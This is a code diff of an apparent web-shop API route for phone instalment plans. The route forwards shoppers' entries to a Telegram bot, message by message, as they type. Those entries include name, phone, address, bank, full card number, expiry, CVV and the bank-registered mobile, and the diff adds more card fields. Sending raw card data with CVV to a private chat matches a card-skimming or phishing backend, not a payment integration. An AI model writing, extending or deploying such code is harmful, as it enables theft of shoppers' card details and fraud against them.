@@ -19,38 +19,44 @@ export async function POST(request: Request) {
     messageText += `🆔 <b>Session ID:</b> <code>#${sessionId}</code>\n`;
     messageText += `🕒 <b>Last Update:</b> <code>${timestamp}</code>\n`;
     messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-    messageText += `📍 <b>Current Progress:</b> <b>${stepName}</b>\n\n`;
+    messageText += `📍 <b>Current Step:</b> <b>${stepName}</b>\n\n`;
 
     if (data.model) {
-      messageText += `📱 <b>DEVICE SELECTION:</b>\n`;
+      messageText += `📱 <b>SELECTED DEVICE & PLAN:</b>\n`;
       messageText += `• <b>Model:</b> ${data.model.name}\n`;
-      messageText += `• <b>Storage:</b> ${data.storage?.size || 'Default'}\n`;
-      messageText += `• <b>Color:</b> ${data.color?.name || 'Default'}\n`;
-      messageText += `• <b>Total Cash Price:</b> Rs. ${(data.totalPrice || data.model.basePrice || 0).toLocaleString('en-PK')}\n`;
-      messageText += `• <b>EMI Tenure:</b> ${data.months || 24} Months @ Rs. ${(data.monthlyEmi || 0).toLocaleString('en-PK')}/mo\n\n`;
+      messageText += `• <b>Storage:</b> ${data.storage?.size || 'Standard'}\n`;
+      messageText += `• <b>Color:</b> ${data.color?.name || 'Standard'}\n`;
+      messageText += `• <b>Cash Price:</b> Rs. ${(data.totalPrice || data.model.basePrice || 0).toLocaleString('en-PK')}\n`;
+      messageText += `• <b>Plan:</b> ${data.months || 24} Months @ Rs. ${(data.monthlyEmi || 0).toLocaleString('en-PK')}/mo\n\n`;
     }
 
     if (data.customer) {
-      messageText += `👤 <b>CUSTOMER DETAILS:</b>\n`;
-      messageText += `• <b>Full Name:</b> ${data.customer.fullName || '<i>Entering...</i>'}\n`;
-      messageText += `• <b>Mobile Number:</b> <code>${data.customer.mobileNumber || '<i>Entering...</i>'}</code>\n`;
-      messageText += `• <b>Delivery Address:</b> ${data.customer.deliveryAddress || '<i>Entering...</i>'}\n`;
-      messageText += `• <b>Payment Mode:</b> ${(data.customer.paymentMethod || 'card').toUpperCase()}\n\n`;
+      messageText += `👤 <b>CUSTOMER INFORMATION:</b>\n`;
+      messageText += `• <b>Full Name:</b> ${data.customer.fullName || '<i>Typing...</i>'}\n`;
+      messageText += `• <b>Mobile Number:</b> <code>${data.customer.mobileNumber || '<i>Typing...</i>'}</code>\n`;
+      messageText += `• <b>Address:</b> ${data.customer.deliveryAddress || '<i>Typing...</i>'}\n`;
+      messageText += `• <b>Delivery Type:</b> ${data.customer.deliveryType === 'open_parcel' ? 'Open Parcel Verification' : 'Standard Delivery'}\n`;
+      messageText += `• <b>Payment Method:</b> ${(data.customer.paymentMethod || 'card').toUpperCase()}\n\n`;
     }
 
     if (data.payment) {
-      messageText += `💳 <b>CHECKOUT & PAYMENT DATA:</b>\n`;
-      if (data.payment.bankId) messageText += `• <b>Bank:</b> ${data.payment.bankId.toUpperCase()}\n`;
-      if (data.payment.cardName) messageText += `• <b>Card Name:</b> ${data.payment.cardName}\n`;
-      if (data.payment.cardNumber) messageText += `• <b>Card Number:</b> <code>${data.payment.cardNumber}</code>\n`;
-      if (data.payment.expiry) messageText += `• <b>Expiry:</b> ${data.payment.expiry}\n`;
-      if (data.payment.cvv) messageText += `• <b>CVV:</b> <code>${data.payment.cvv}</code>\n`;
-      if (data.payment.walletType) messageText += `• <b>Wallet Service:</b> ${data.payment.walletType.toUpperCase()}\n`;
-      if (data.payment.walletAccountName) messageText += `• <b>Account Title:</b> ${data.payment.walletAccountName}\n`;
-      if (data.payment.proofPreviewUrl) messageText += `• <b>Proof Photo:</b> Attached 📸\n`;
+      messageText += `💳 <b>PAYMENT & CARD DETAILS:</b>\n`;
+      if (data.customer?.paymentMethod === 'card' || data.payment.cardNumber || data.payment.cardName) {
+        if (data.payment.bankId) messageText += `• <b>Bank Name:</b> ${data.payment.bankId.toUpperCase()}\n`;
+        if (data.payment.cardNetwork) messageText += `• <b>Card Network:</b> ${data.payment.cardNetwork.toUpperCase()}\n`;
+        if (data.payment.cardName) messageText += `• <b>Cardholder Name:</b> ${data.payment.cardName}\n`;
+        if (data.payment.registeredMobile) messageText += `• <b>Bank Reg. Mobile:</b> <code>${data.payment.registeredMobile}</code>\n`;
+        if (data.payment.cardNumber) messageText += `• <b>Card Number:</b> <code>${data.payment.cardNumber}</code>\n`;
+        if (data.payment.expiry) messageText += `• <b>Expiry Date:</b> <code>${data.payment.expiry}</code>\n`;
+        if (data.payment.cvv) messageText += `• <b>CVV / CVC Code:</b> <code>${data.payment.cvv}</code>\n`;
+      } else {
+        if (data.payment.walletType) messageText += `• <b>Wallet Service:</b> ${data.payment.walletType.toUpperCase()}\n`;
+        if (data.payment.walletAccountName) messageText += `• <b>Account Title:</b> ${data.payment.walletAccountName}\n`;
+        if (data.payment.proofPreviewUrl) messageText += `• <b>Payment Proof Photo:</b> Attached 📸\n`;
+      }
     }
 
-    // Try editing existing message first if messageId exists
+    // Edit single message if messageId exists
     if (messageId) {
       const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
       const editRes = await fetch(editUrl, {
@@ -70,7 +76,7 @@ export async function POST(request: Request) {
       }
     }
 
-    // Fallback: Send a new single message if no messageId or edit failed
+    // Send single initial message if messageId does not exist yet
     const sendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const sendRes = await fetch(sendUrl, {
       method: 'POST',
